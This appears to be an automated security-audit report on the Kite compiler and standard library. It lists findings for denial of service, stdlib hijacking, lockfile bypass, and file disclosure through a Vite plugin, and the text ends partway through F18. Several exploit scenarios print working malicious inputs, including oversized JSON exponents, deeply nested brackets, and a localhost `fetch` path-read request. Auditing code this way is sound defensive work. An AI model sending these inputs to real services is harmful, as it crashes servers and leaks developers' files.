# Claude Security results

Scanned the whole Kite repository at `/Users/channyeintun/Desktop/may`, revision `9028c68f2b568382212d9507aa21824de8e8fdc8`, on 2026-08-07 at 06:34:36 UTC. Full-repository scan, no scope narrowing, medium effort. **21 findings survived verification: 3 HIGH, 17 MEDIUM, 1 LOW.** The dominant theme is untrusted input reaching code that assumes it is well-formed — a compiler front-end with no recursion or span-validity guards, standard-library parsers that let a document choose a loop's trip count, and a module system where a dependency can rename the standard library out from under its dependent.

## Coverage

The inventory partitioned the tree into 11 components, all scanned: **compiler-frontend** (`kite-lexer`, `kite-parser`, `kite-ast`, `kite-span`, `kite-diag`, `kite-hir`, `kite-resolve`, `kite-types`, `kite-mir`), **compiler-backends** (`kite-codegen-kbc`, `kite-codegen-wasm`, `kite-codegen-clif`, `kite-vm`, `kite-rt`), **kite-driver-cli** (`kite-driver`, `bin/kitec`), **kite-lsp**, **std-library** (`std`), **site-playground** (`site`), **npm-packages** (`kite-cli`, `kite-wasm`, `vite-plugin-kite`), **kite-playground-wasm**, **editor-vscode-extension**, **tooling-support** (`kite-fmt`, `kite-doc`), and **packaging-and-ci** (`.github`, `packaging`, `.cargo`, `bin`).

Two areas were deliberately not examined:

- **`examples/`, `tests/`, `docs/`** — "Sample programs, test fixtures/corpus, and design documentation - not shipped or attacker-reachable code."
- **`.claude/`** — "Local assistant tooling settings, not part of the shipped product."

Completeness was **checked**: all 13 top-level directories are accounted for, each either scanned or explicitly skipped above. Nothing was left in neither ledger.

Caps and truncation, stated plainly:

- **29 candidate sites went unverified by cap.** 86 candidates were raised and 74 remained after deduplication; the panel cast 135 votes. The 29 unreviewed sites are neither confirmed nor cleared — they were never put to the panel. A clean area in this report means "examined and nothing survived", but those 29 sites mean the report is not an exhaustive verdict on every candidate raised.
- **Two research cells were pruned:** `npm-packages:memory-and-unsafe` and `editor-vscode-extension:memory-and-unsafe` — memory-safety research over JavaScript packages, which has no meaningful surface.
- No components were dropped, and 43 of 43 dispatched researchers returned (one researcher per component × category, the medium-effort shape).

## Findings

### F1 — `use X as Y` aliases are program-global, so any module can rewrite every other module's qualified names (stdlib hijack) (HIGH, confidence high)

**Impact.** A third-party module silently substitutes its own functions for standard-library ones across the entire program. `crypto.hash(secret)`, `fs.read(path)` or `http.get(url)` written in the victim's own source resolve to attacker-supplied bodies, which run with the program's full authority — exfiltration, tampering with authentication results, or returning forged data, with nothing in the victim's source changed.

**Where.** `crates/kite-resolve/src/lib.rs:441` in `Modules::canonical`

**What.** `Loader.aliases` is one flat `HashMap<String,String>` filled by `visit_uses` for every file of every loaded module (`crates/kite-driver/src/modules.rs:167`), handed whole to the resolver (`crates/kite-driver/src/lib.rs:414`), and `Modules::canonical` applies it to the head of *every* dotted name regardless of which module wrote the alias — so an alias declared in an untrusted dependency rewrites the trusting program's own `fs.read` / `crypto.hash` / `http.get` call sites.

**Exploit scenario.** A dependency `evil` ships `.kite/vendor/evil/leak/` and, in one of its own files, writes `use leak as crypto`. The loader records `aliases["crypto"] = "leak"` in the program-wide map. When the application's own `main.kite` calls `crypto.hash(password)`, `fn_by_name_in` first calls `canonical("crypto.hash")`, which rewrites it to `leak.hash`; `find_fn` then binds the call to the attacker's `pub fn hash`. The genuine `std/crypto` module is still loaded but is now unreachable by name, and no diagnostic is produced.

**Preconditions.**
- The program loads at least one module whose source the attacker controls (a `.kite/vendor` dependency, a git/path dependency, or any sibling module of the entry file)
- The attacker's substitute functions are marked `pub` so `check_visible` passes

**Fix.** Scope aliases to the file (or at least the module) that declared them: key the alias table by the declaring module and have `canonical` take the asking module into account, so `use X as Y` only affects names written in that module. Additionally reject an alias that collides with the name of an already-imported or standard-library module.

**Verification.** 3/3 lens verifiers confirmed.

### F2 — json.parse: exponent digits drive an unbounded loop — a 12-byte document wedges the program (HIGH, confidence high)

**Impact.** A document as small as `1e2000000000` makes `json.parse` spin through two billion float multiplications. Kite's scheduler is cooperative and this loop contains no `task.yield()`, so every other task — including a server's accept loop — is starved for the duration. Larger exponents (`1e999999999999999`) never finish. One unauthenticated request permanently removes the process from service.

**Where.** `std/json.kite:253` in `exponent`

**What.** `power` is read straight out of the attacker's JSON document (`parse_number` calls `exponent` for any `e`/`E`) and is then used as the trip count of a loop with no upper bound, so the caller of `json.parse` controls how many iterations the parser performs.

**Exploit scenario.** An attacker POSTs the body `{"n":1e999999999999}` to any Kite service that parses request bodies with `json.parse`. `parse_number` sees `e`, calls `exponent`, reads a 12-digit `power`, and enters `for n in 0..power`. The task never yields and never returns; the server answers nothing further.

**Preconditions.**
- The program calls `std/json.parse` on input it did not author (an HTTP body, a socket frame, an SSE payload)

**Fix.** Bound the exponent before using it as a trip count: reject (or saturate) any `power` outside roughly -324..308, which is the whole range a `float` can represent, and compute the scale with repeated squaring rather than `power` iterations.

**Verification.** 3/3 lens verifiers confirmed.

### F3 — json.parse: unchecked accumulation of exponent digits traps on integer overflow, aborting the program (HIGH, confidence high)

**Impact.** An integer overflow trap is not catchable in Kite (`SPECIFICATION.md` §7.7: "A trap is not catchable. There is no `recover`"), so a ~25-byte JSON document terminates the whole module — every task, every in-flight request. In a `--release` build the multiply wraps instead, silently producing an arbitrary `power` that then feeds the unbounded loop two lines below.

**Where.** `std/json.kite:249` in `exponent`

**What.** The digit count after `e` is entirely attacker-chosen, and `power * 10 + d` is an ordinary checked `int` multiply — kite-types lowers `Mul` to `MulInt` unless `--release` was passed (`crates/kite-types/src/lib.rs:6826`) and every backend traps on `MulInt` overflow (`kite-codegen-wasm/src/lib.rs:3500` emits `Unreachable`, kite-codegen-clif `smul_overflow`, kite-vm `checked_mul`).

**Exploit scenario.** An attacker sends the body `{"a":1e99999999999999999999}`. At the nineteenth exponent digit `power * 10` exceeds `max_int`, the emitted overflow check fires `unreachable`, and the WebAssembly instance aborts. No error is returned to the caller and nothing can catch it.

**Preconditions.**
- The program calls `std/json.parse` on untrusted text
- Default (non-`--release`) build for the abort variant; `--release` gives the silent-wrap variant

**Fix.** Stop accumulating once `power` exceeds a sane cap (e.g. 4 digits / 9999), or use `math.checked_add` / an explicit `power > (max_int - d) / 10` guard and return a parse error instead of overflowing.

**Verification.** 3/3 lens verifiers confirmed.

### F4 — Unbounded mutual recursion between scan_string and skip_interpolation lets ~3 bytes of source add a stack frame pair (MEDIUM, confidence medium)

**Impact.** Stack exhaustion aborts the process before any diagnostic can be produced: language-server death, wasm module trap, `kitec fmt`/`kitec doc` crash on a file they promise to survive.

**Where.** `crates/kite-lexer/src/lib.rs:485` in `Lexer::skip_interpolation`

**What.** `scan_string` calls `skip_interpolation` on `\(` (`lib.rs:458`) and `skip_interpolation` calls `scan_string` back on any `"` (`lib.rs:485`) with no depth counter anywhere in the lexer, so the nesting depth of a repeated `"\(` sequence in attacker-supplied source directly drives native stack depth.

**Exploit scenario.** A file whose body is the 3-byte group `"\(` repeated N times drives one `scan_string` + one `skip_interpolation` frame per group: `scan_string` sees `"`, steps past `\`, sees `(` and calls `skip_interpolation`, which immediately sees the next `"` and calls `scan_string` again. A few hundred kilobytes of such input exhausts an 8 MB stack. This happens in the very first pass, so it also hits `kite_fmt::format` and `kite_doc::extract`, which document themselves as never failing on unparseable input, and `kite-lsp`'s didOpen/didChange handlers.

**Preconditions.**
- Any consumer that tokenizes untrusted source: `tokenize()`, `tokenize_range()`, `tokenize_with_comments()`
- No source-size or nesting cap exists between the entry points and the lexer

**Fix.** Carry a recursion-depth counter on `Lexer` (or convert the string/interpolation scanner to an explicit stack) and report a diagnostic such as "interpolation nested too deeply" past a fixed limit instead of recursing.

**Verification.** 2/3 lens verifiers confirmed.

### F5 — Vite plugin `load` reads an arbitrary filesystem path from the `\0kite-glue:` module id, bypassing Vite's `server.fs.allow` boundary (MEDIUM, confidence high)

**Impact.** Any file named `app.js` anywhere on the developer's filesystem — outside the Vite root and outside `server.fs.allow` — is read and returned as module source over the dev server. `app.js` is a very common name for Node/Express entrypoints, which frequently hold credentials and connection strings, so this is a real source/secret disclosure primitive against a machine running `vite dev`.

**Where.** `packages/vite-plugin-kite/index.js:226` in `load`

**What.** The module id is an untrusted source in a Vite dev server (a browser can request any id via `/@id/__x00__…`, which Vite's transform middleware un-wraps back to a `\0`-prefixed id before calling plugin `resolveId`/`load`); `load` slices everything after the `\0kite-glue:` prefix and passes it straight to `readFile` with no check that it is one of the cache directories the plugin itself created.

**Exploit scenario.** The developer runs `npm run dev` (Vite on localhost:5173) and browses to an attacker-controlled page. That page issues `fetch("http://localhost:5173/@id/__x00__kite-glue:/Users/victim/work/backend/src", {mode:"cors"})`. Vite's transform middleware rewrites `/@id/__x00__` to `\0`, the plugin's `resolveId` accepts any `\0kite-glue:` id verbatim, and `load` returns the contents of `/Users/victim/work/backend/src/app.js` as the response body. The plugin itself emits imports of exactly this shape (line 260), so the route is known-good; only the path is unvalidated.

**Preconditions.**
- A project using `vite-plugin-kite` is running the Vite dev server
- The attacker can cause a request to the dev server (a page open in the developer's browser, or the server bound to a reachable interface via `server.host`) and read the response (default-permissive dev CORS, or a same-origin/XSS foothold)
- The target file is named `app.js`

**Fix.** Confine the glue id to directories the plugin produced: keep the `out` paths it returned from `compile()` in a Set (or re-derive `outputFor(file)`) and reject any `\0kite-glue:` id not in it. A cheaper stopgap is `const dir = resolve(id.slice(GLUE.length)); if (!dir.startsWith(resolve(cacheDir) + sep)) return null;`.

**Verification.** 3/3 lens verifiers confirmed.

### F6 — Unbounded parser recursion on nested parentheses aborts the language server when a crafted .kite file is opened (MEDIUM, confidence high)

**Impact.** A stack-guard abort (SIGSEGV/SIGABRT) of the kite-lsp process. The VS Code extension clears every diagnostic, restarts once, and — because reopening the same document re-triggers the crash — ends with "Diagnostics are off until the window is reloaded". `kitec check`/`build` on the same file dies the same way, so a package can make a build crash rather than fail. There is no `catch_unwind` anywhere in the workspace, and a stack overflow could not be caught by one anyway.

**Where.** `crates/kite-parser/src/lib.rs:1783` in `Parser::parse_primary`

**What.** `textDocument/didOpen`/`didChange` hands the whole untrusted document text to `compile(&path, &text, Emit::Check)` (`crates/kite-lsp/src/server.rs:133`), which runs `kite_parser::parse`; the parenthesised-expression branch of `parse_primary` recurses back into `parse_expr` with no depth counter, so nesting depth in the file is bare stack depth in the process.

**Exploit scenario.** An attacker commits `evil.kite` containing `fn main() {\n  let x = ((((…1…))))\n}` with ~50k nested parentheses. The victim clones the repo and opens the file; the extension sends `textDocument/didOpen` with the whole text; `compile` lexes it fine (the lexer is iterative) and then `parse_primary` recurses ~4 frames per paren until the guard page is hit, killing kite-lsp. All Kite diagnostics in the window stop working.

**Preconditions.**
- The victim opens (or a build touches) a `.kite` file containing a deeply nested expression such as tens of thousands of `(` characters
- Default stack size for the process main thread

**Fix.** Carry an explicit `depth: u32` on `Parser`, increment it at every recursive entry (`parse_expr_bp`, `parse_primary`, `parse_type`, `parse_pattern`, `parse_block`), and emit a syntax diagnostic ("expression nested too deeply") past a fixed ceiling instead of recursing. The nested `Box<Expr>` chain also needs an iterative `Drop` or the same ceiling, since dropping the AST recurses too. Independently, run the compiler passes on a thread with a known stack size so the depth ceiling can be reasoned about.

Note the asymmetry with the VM, which already guards exactly this: `crates/kite-vm/src/lib.rs:20` sets `MAX_FRAMES = 2048` and traps at `lib.rs:1245`, with a regression test named `runaway_recursion_traps_instead_of_crashing_the_host`. The front-end that runs before the VM never got the equivalent.

**Verification.** 3/3 lens verifiers confirmed. Separately from the scan pipeline (which executes nothing), this session reproduced the crash directly: `kitec check` on a 50,000-deep nested expression exits 134 (SIGABRT) with "fatal runtime error: stack overflow", while a 500-deep file checks normally.

### F7 — Unterminated interpolated string literal makes the parser emit a span that ends mid-UTF-8-character, panicking the unchecked slice in SourceMap::span_text (MEDIUM, confidence medium)

**Impact.** Deterministic remote/untrusted-input panic in the compiler frontend: kills the kite-lsp process for the whole editor session, traps the wasm playground/build module, and aborts kitec. Availability only — Rust's bounds check turns the invalid index into a panic rather than a read.

**Where.** `crates/kite-span/src/lib.rs:170` in `SourceMap::span_text`

**What.** Attacker-supplied `.kite` source reaches `Parser::split_interpolation`, which computes the trailing text run as `bytes.len() - open` on the assumption that every string token ends with its closing delimiter; for an unterminated literal that offset lands inside a multi-byte character, and the resulting `StrPart::Text` span is fed straight into this unchecked `str` slice by `Checker::text_run_value`.

**Exploit scenario.** A `.kite` file containing `fn main() {\n  let s = "\(1)é\n}` lexes as one unterminated `Str` token spanning bytes S..S+7 (`"`, `\`, `(`, `1`, `)`, 0xC3, 0xA9). `split_interpolation` parses the hole, sets `run = 5`, then computes `text_end = 7 - 1 = 6` and pushes `StrPart::Text(Span(S+5, S+6))`. Byte S+6 is the continuation byte of `é`. `run_passes` does not bail on the lexer's E0001 before type checking (the `diags.has_errors()` return is at `kite-driver/src/lib.rs:437`, after `check_recording` at `:418`), so `Checker::interpolated` (`kite-types/src/lib.rs:2104`) calls `text_run_value`, which slices `&text[S+5..S+6]` and panics with "byte index is not a char boundary". Serving this file to a kite-lsp session (didOpen) kills the language server; passing it to `kite_check`/`kite_run` traps the playground wasm module; `kitec` aborts.

**Preconditions.**
- Compiler (`kitec` / `kite-lsp` / `kite-playground` wasm) is asked to check or compile the attacker's source
- The literal contains at least one `\(...)` hole and is not closed by a `"` before the newline/EOF
- The bytes between the hole's `)` and the end of the token end in a multi-byte UTF-8 character

**Fix.** Have `split_interpolation` derive the closing-delimiter offset from what the lexer actually consumed (or record on the token whether the literal was closed) instead of assuming `open` bytes of delimiter at the end, and clamp/validate the resulting offsets with `str::is_char_boundary`. Independently, make `SourceMap::span_text`/`snippet`/`text_before`/`line_col` return a fallible or clamped result rather than slicing a `str` by unvalidated `u32` offsets.

**Verification.** 2/3 lens verifiers confirmed.

### F8 — Generated Node server adapter buffers request bodies without any size limit and never releases answered requests (MEDIUM, confidence high)

**Impact.** A single large POST, or a stream of ordinary requests, exhausts the process heap: the body is held whole in memory before the program ever sees it, and every request object (body, headers and the live `res`) is retained for the lifetime of the process. The server is killed or wedged by an unauthenticated client, and no configuration in the generated file bounds it.

**Where.** `crates/kite-codegen-wasm/src/serve.rs:103` in `generate_server`

**What.** An unauthenticated HTTP request body is accumulated into a JavaScript string with no maximum, and each request is then pushed onto a `REQUESTS` array that is never pruned, so an attacker fully controls the memory the generated server holds.

**Exploit scenario.** An attacker sends `POST /` with `Transfer-Encoding: chunked` and streams gigabytes; `body += chunk` grows unbounded until the Node process aborts with an out-of-memory error. Even without one large request, N ordinary requests permanently retain N entries in `REQUESTS`, so a long-running server leaks until it dies.

**Preconditions.**
- The program declares `net.serve_open` so `kitec build` emits `serve.mjs`
- The server is reachable by the attacker (its default deployment)

**Fix.** Cap the accumulated body (respond 413 and `req.destroy()` past a limit), and delete or null the `REQUESTS` slot once `serve_respond` has answered — or use a Map keyed by handle so answered entries can be removed.

**Verification.** 3/3 lens verifiers confirmed.

### F9 — `kite.lock` is written but never verified — a dependency whose bytes changed is accepted silently and the build never consults the lock (MEDIUM, confidence medium)

**Impact.** The documented supply-chain control ("the lockfile records the content hash of every dependency, so what is built twice is built from the same bytes twice") enforces nothing. A dependency whose contents changed under the same version — a moved git tag, a re-pushed repository, or a MITM on the `git://` and `http://` URLs `check_url` explicitly permits — is compiled and run without any command failing.

**Where.** `bin/kitec/src/pkg.rs:65` in `run`

**What.** The content hashes computed from the vendored dependency directories are written straight over the committed `kite.lock`; no code path in the repository reads `kite.lock` back, so the recorded hash never gates anything, and the module loader compiles `.kite/vendor/<name>` with no integrity check at all.

**Exploit scenario.** A project pins `markdown = { git = "git://example/md", tag = "v1.2.0" }` and commits `kite.lock` with hash H. The attacker force-moves tag `v1.2.0` to a commit containing extra `.kite` code. On a machine with no prior checkout, `kitec pkg` clones the new content, recomputes hash H', overwrites `kite.lock` with H', prints "kite.lock changed" to stderr and exits 0; CI treats that as success and the subsequent build compiles the attacker's module, because nothing compares H' with the committed H.

**Preconditions.**
- The project uses a git dependency
- The attacker controls that repository, or the network path for a `git://`/`http://` dependency URL

**Fix.** Read `kite.lock` before resolution and fail (non-zero exit) when a resolved dependency's hash differs from the recorded one unless an explicit `--update` was given; have the compiler verify `.kite/vendor/<name>` against the lock at build time; and replace the FNV-1a digest with a cryptographic hash, since FNV is trivially collidable by an attacker who controls the dependency's bytes.

**Verification.** 2/3 lens verifiers confirmed.

### F10 — Unterminated interpolated string yields a span that splits a UTF-8 character, panicking the compiler (and the language server) (MEDIUM, confidence high)

**Impact.** A single malformed source file kills the process: the language server dies (`main.rs` drives the message loop with no `catch_unwind`, so the panic unwinds out of `main` and the editor loses all Kite analysis until restarted), and `kitec check`/`fmt`/the wasm playground abort on the same input.

**Where.** `crates/kite-span/src/lib.rs:170` in `SourceMap::span_text`

**What.** `split_interpolation` computes the trailing text-run of a string literal as `bytes.len() - open`, which for an *unterminated* literal (the lexer still emits a `Str` token for one) is an arbitrary byte offset, not the closing quote; the type checker then slices the source with that span at `span_text`, and a `&str` slice on a non-char-boundary index panics. The untrusted source is `params.textDocument.text` handed to `compile()` at `crates/kite-lsp/src/server.rs:133`. This is the same root cause as F7, reached by a second researcher along a slightly different path — one fix at `split_interpolation` plus a clamped `span_text` closes both.

**Exploit scenario.** A repository contains `fn main() {\n    let s = "x\(1)é\n}\n`. The lexer reports E0001 but still emits one `Str` token spanning `"x\(1)é` (8 bytes). `split_interpolation` pushes a trailing Text run with end = start+7, which is the middle of the two-byte `é`. `check_recording` reaches `text_run_value` for that run, `span_text` slices `&text[start+6..start+7]`, and Rust panics with "byte index is not a char boundary". Opening that file in an editor kills kite-lsp; running `kitec check` on it aborts the build.

**Preconditions.**
- The document contains a string literal with an interpolation hole `\(...)` that is never closed by a quote before the end of the line/file
- At least one multi-byte UTF-8 character sits after the last hole, so `bytes.len() - 1` lands inside it
- Any request that compiles the buffer (didOpen/didChange/didSave/hover/definition/…) is issued

**Fix.** In `split_interpolation`, derive `text_end` from the actual closing delimiter (and clamp it to `floor_char_boundary`/`is_char_boundary`) instead of assuming the literal is well formed; independently, make `SourceMap::span_text`/`snippet` return `text.get(range)` and fall back to an empty string so a bad span can never panic a long-running server.

**Verification.** 3/3 lens verifiers confirmed.

### F11 — json.parse is quadratic in document size and permanently retains every intermediate string (MEDIUM, confidence high)

**Impact.** An unauthenticated request carrying a few hundred KB of JSON drives the single-threaded event loop into ~10^10–10^12 character operations and, on the wasm target, into hundreds of megabytes to gigabytes of never-reclaimed string-table memory. The server stops answering every other client and eventually dies of OOM. `examples/server.kite`'s `/echo` route (`json.stringify` of `request.body`) is exactly this shape and is reachable without credentials.

**Where.** `std/json.kite:174` in `parse_string`

**What.** `json.parse` consumes wholly attacker-controlled text (an HTTP request body, a fetched response, a WebSocket frame) and scans it one character at a time with `input.slice(i, i+1)` and `out = out + c`; both of those lower to host primitives that are O(n) per call (`str_slice` spreads the entire source string, `str_concat` allocates a full copy), so a single document costs O(n²) time — and on the wasm/Node target `str_concat` calls `intern`, which pushes every intermediate result into the module's permanent `STRINGS` table, so O(n²) bytes are retained and never freed.

**Exploit scenario.** Attacker POSTs a 500 KB body to a Kite server built on std/http that parses or re-encodes it with std/json. `parse_string`/`quote` executes 500,000 iterations, each spreading a 500 KB JS string and interning a new string averaging 250 KB, i.e. ~125 GB of allocation that the STRINGS table holds live. The process hangs and then OOMs; one request is enough.

**Preconditions.**
- The program calls `json.parse` (or `json.stringify`, whose `quote` uses the same per-character accumulator) on data it received from the network
- Default deployment: the Node `serve.mjs` adapter accumulates request bodies with no size limit (`crates/kite-codegen-wasm/src/serve.rs:103`), so `n` is chosen by the attacker

**Fix.** Do not build strings a character at a time in the parser. Scan for the extent of a run (`index_of` on the delimiter) and take a single `slice`, so the cost is proportional to the run length rather than to its square; and give the host a string builder / rope, or at minimum stop `str_concat` from calling `intern` (interned constants and runtime-produced strings should not share one unbounded table). Also cap the document size accepted from the network.

**Verification.** 3/3 lens verifiers confirmed.

### F12 — toml.parse: integer literal accumulator overflows and traps on a long run of digits (MEDIUM, confidence high)

**Impact.** A document containing `n = 99999999999999999999` aborts the process instead of returning the `(Toml, error)` pair the module promises. Under `--release` it wraps, so a configured limit or port number silently becomes a different value than the file says.

**Where.** `std/toml.kite:1170` in `int_of`

**What.** The digits come directly from the TOML document handed to `toml.parse`, and the accumulation is an unchecked `int` multiply-add that traps on overflow in a default build; `int_of` is also the path a float's exponent takes (`std/toml.kite:1092`).

**Exploit scenario.** A build tool parses a dependency's `kite.toml`. The dependency ships `version = 99999999999999999999`; `int_of` overflows on the nineteenth digit and the tool aborts with an uncatchable trap rather than a diagnostic.

**Preconditions.**
- `toml.parse` is called on a document the program did not author (uploaded config, package manifest from a registry, user-supplied settings)

**Fix.** Return `errors.new("toml: `\(body)` does not fit in an int")` when `value > (max_int() - digit) / 10` rather than performing the multiply.

**Verification.** 3/3 lens verifiers confirmed.

### F13 — toml.parse: float exponent is used directly as a loop trip count (MEDIUM, confidence high)

**Impact.** `x = 1e2000000000` makes the parser perform two billion float multiplications inside a cooperative scheduler that cannot preempt it; larger exponents never terminate. Availability of the whole runtime is lost to one document.

**Where.** `std/toml.kite:1134` in `power_of_ten`

**What.** `exp` is the exponent text of a float literal in the parsed document (`std/toml.kite:1092-1098`) with no bound applied, and it is the trip count of both loops here.

**Exploit scenario.** A service that accepts a TOML configuration upload is given `t = 1e999999999999`. `float_of` reaches `power_of_ten` with that exponent and the request handler never returns.

**Preconditions.**
- `toml.parse` is called on a document the program did not author

**Fix.** Clamp `exp` to the representable decimal range of a `float` (about -324..308) before looping, answering 0.0 or the largest float outside it, and compute the power by repeated squaring.

**Verification.** 3/3 lens verifiers confirmed.

### F14 — `kitec doc` panics (index out of bounds) on any .kite file that has comments but no declarations (MEDIUM, confidence medium)

**Impact.** Unhandled panic/abort in every consumer of kite-doc: `kitec doc` (`bin/kitec/src/main.rs:197`) exits with a panic, the npm WebAssembly CLI (`kite.docs`, `packages/kite-wasm/kitec.js:108`) aborts, and the `kite_docs` FFI export (`crates/kite-playground/src/lib.rs:133`) panics across an `extern "C"` boundary, trapping and poisoning the wasm instance so the playground must be reloaded. Denial of service on any doc-generation step fed untrusted source.

**Where.** `crates/kite-doc/src/lib.rs:123` in `Reader::block_before`

**What.** `extract()` computes `first_item` from the parsed items and falls back to the sentinel `u32::MAX` when there are none (line 55); that sentinel is passed straight through `overview()` into `block_before()` and used as the upper bound of a `&str` slice, so any attacker-supplied source with at least one comment and zero parsed items indexes `src` at byte 4294967295 and panics.

**Exploit scenario.** A repository ships a stub module `crates/foo/todo.kite` containing only `// TODO: write this` (or a header comment plus `use std/io`). A maintainer or a CI job runs `kitec doc todo.kite`, or a bundler plugin calls `kite.docs(source)` from `packages/kite-wasm`. `ast.items` is empty, `first_item` becomes `u32::MAX`, and `block_before` slices `src[6..4294967295]`, panicking. In the wasm build the panic aborts the module, so a documentation or build pipeline stops on a file that is otherwise valid Kite.

**Preconditions.**
- The source file contains at least one `//` or `///` comment
- The file produces no `Item` — i.e. it holds only comments/whitespace, or only comments plus `use` lines (`parse_source_file` consumes `use` into `file.uses`, not `file.items`)

**Fix.** Replace the `u32::MAX` sentinel with an explicit bound: `let first_item = ast.items.iter().map(|i| i.span().start).min().unwrap_or(src.len() as u32);`, and additionally clamp both ends in `block_before` and `overview` (`let hi = (edge as usize).min(self.src.len()); let lo = (c.span.end as usize).min(hi);`) or use `self.src.get(lo..hi).unwrap_or("")` so no span arithmetic can panic.

**Verification.** 2/3 lens verifiers confirmed.

### F15 — Release workflow's RUSTFLAGS env var silently overrides `.cargo/config.toml`, shipping kitec without the frame pointers the GC's stack walk requires (MEDIUM, confidence high)

**Impact.** Every released `kitec` for `x86_64-unknown-linux-musl`, `aarch64-unknown-linux-musl` and `x86_64-pc-windows-msvc` — the binaries `install.sh`, the Homebrew formula, the AUR `kite-bin` PKGBUILD and the Scoop manifest all install — contains a `kite-rt` compiled without frame pointers. Per the repo's own commit `fa28e38` ("The collector walked frames that were not frames"), on those exact targets `rbp` is then an ordinary callee-saved register and the walk "read a number as a frame record, computed a stack-map slot from it, and handed the collector a stack word that was never a reference": missed roots (use-after-free of still-live Kite objects after `collect_minor`/`collect_major`), wild reads at `*(fp)` / `*(fp + 8)`, and writes through `evac_slot` to addresses that were never GC slots. CI never sees this because no CI job sets `RUSTFLAGS`, so `cargo test --workspace` builds with the flag while the shipped artefact does not.

**Where.** `.github/workflows/release.yml:52` in `jobs.build` → step "build" (`env.RUSTFLAGS`)

**What.** The only place `-C force-frame-pointers=yes` is set is `.cargo/config.toml`'s `[build] rustflags` (line 25), and Cargo's four flag sources are mutually exclusive with the `RUSTFLAGS` environment variable winning over `build.rustflags`. By setting `RUSTFLAGS` here, the release job replaces the config value outright, so every published binary is built without the flag that `crates/kite-rt/src/lib.rs`'s frame-pointer stack walk (`stack_root_slots`, line 767) depends on for memory safety.

**Exploit scenario.** A user installs kitec via `install.sh`/Homebrew/AUR on x86-64 Linux and runs a Kite program with `kitec run --native`. When the nursery fills, `collect_minor` calls `stack_root_slots`, which starts from `current_fp()` — an `rbp` the optimiser has repurposed inside kite-rt's own frames because `-C force-frame-pointers=yes` was dropped. The walk either terminates early (live objects are neither evacuated nor marked, and the mutator keeps using the freed/stale addresses — a use-after-free) or accepts a bogus frame whose `ret` happens to hit a registered safepoint, at which point `evac_slot` writes an evacuated pointer into a stack word that is not a GC slot. An attacker who supplies the `.kite` source — a dependency resolved by `kitec pkg`, a sample from a tutorial, a program in CI — controls allocation shape and GC timing and so controls when this happens, turning it from a crash into a shaped heap corruption.

**Preconditions.**
- The user runs a released (not locally built) kitec on x86-64 Linux or Windows
- The native backend is used: `kitec run --native`, `kitec --emit native`, or `kitec build --emit native` — the JIT path `kite_codegen_clif::run_jit` links kite-rt in-process
- The compiled program allocates enough to trigger a minor or major collection

**Fix.** Append `-C force-frame-pointers=yes` to the `RUSTFLAGS` value in both `release.yml` env blocks (lines 52 and 99), and stop relying on `build.rustflags` as the sole carrier of a memory-safety-critical flag, since any `RUSTFLAGS` in the environment silently replaces it. A durable fix is to make the requirement enforceable rather than conventional: have `kite-rt` refuse to build (or make `stack_root_slots` refuse to walk) when frame pointers were not forced on a target whose ABI does not guarantee them, and add a CI assertion that the release build command carries the flag.

**Verification.** 3/3 lens verifiers confirmed.

### F16 — JSON parser recurses without a depth limit; a deeply nested document traps the Wasm stack and the trap is not caught by the driver (MEDIUM, confidence medium)

**Impact.** A payload of a few thousand `[` characters kills the whole server process, not just the one request — every in-flight connection dies with it.

**Where.** `std/json.kite:126` in `parse_array`

**What.** `parse_value` → `parse_array`/`parse_object` → `parse_value` recurses once per nesting level with no depth counter, driven entirely by attacker-supplied document text; a Wasm stack overflow is a trap, and the generated driver invokes `exports.kite_poll` with no `try`/`catch`, so the trap unwinds out of `drive`/`step` and terminates the host process.

**Exploit scenario.** Attacker POSTs a body of 50,000 `[` characters to any route whose handler calls `json.parse`. `parse_array` recurses 50,000 deep, the WasmGC stack limit is exceeded, `kite_poll` throws a RangeError that nothing catches, `drive` rejects and the Node adapter exits.

**Preconditions.**
- The program calls `json.parse` on network-supplied text
- Wasm/Node target (the shipped `serve.mjs` adapter). The exact nesting depth that overflows was not determined — establishing it would require executing the code, which the scan did not do

**Fix.** Thread a depth argument through `parse_value`/`parse_array`/`parse_object` and return an ordinary `error` past a fixed limit (RFC 8259 allows an implementation-defined nesting cap; 64–128 is conventional). Independently, wrap `exports.kite_poll(...)` in the generated drivers so a trap becomes a reported failure rather than process death.

**Verification.** 3/3 lens verifiers confirmed.

### F17 — Module identity is the bare last `use` segment, so an earlier-loaded user module pre-empts a standard-library module of the same name (MEDIUM, confidence medium)

**Impact.** A standard-library module is silently replaced for the whole program: every `crypto.*`, `fs.*` or `http.*` call in the victim's code binds to the attacker's items instead, with no diagnostic. `std` is not a reserved namespace, so nothing distinguishes the real module from the impostor after loading.

**Where.** `crates/kite-driver/src/modules.rs:184` in `Loader::visit_uses`

**What.** `name` is taken as the last path segment (line 164), discarding the `std` prefix, and this `seen` check then skips any later `use` of the same bare name — so a `use crypto` reaching an attacker-shipped directory registers the name before `use std/crypto` is ever handled, and `load_one`'s `is_std` branch never runs.

**Exploit scenario.** `main.kite` reads `use evil` followed by `use std/crypto`. Loading `evil` recurses into its files, one of which contains `use crypto`; that resolves to `.kite/vendor/evil/crypto/`, is loaded as module `crypto`, and pushes "crypto" onto `seen`. Control returns to the entry file's `use std/crypto`, which hits this `seen` check and is skipped. The program's `crypto.hash(...)` now calls the attacker's function.

**Preconditions.**
- A module the attacker controls is imported (directly or transitively) before the first `use std/<name>` is visited, in the depth-first order of `visit_uses`
- The attacker ships a sibling directory or `<name>.kite` file named exactly like the standard module being displaced

**Fix.** Make `std` part of module identity — key `seen`, `loaded` and the qualification prefix on `std/<name>` versus `<name>` — or reserve the standard-library names so a non-`std` module may not claim one, and report a diagnostic when a `use std/x` is dropped because an `x` was already loaded.

**Verification.** 2/3 lens verifiers confirmed.

### F18 — `kitec check --a11y` executes the file being checked with the unrestricted native filesystem host (MEDIUM, confidence medium)

**Impact.** Arbitrary file read, write and delete with the invoking user's authority, from a command documented as not running the program. On CI this is code execution in the build account when an a11y audit is run over a contributor's branch.

**Where.** `bin/kitec/src/main.rs:441` in `audit_a11y`

**What.** The untrusted source file named on the command line is compiled and then executed through `Compilation::run`, which unconditionally attaches `host::NativeHost` (unsandboxed `fs.read_text`/`fs.write_text`/`fs.remove_path`), under the one subcommand the CLI's own help calls "check without running".

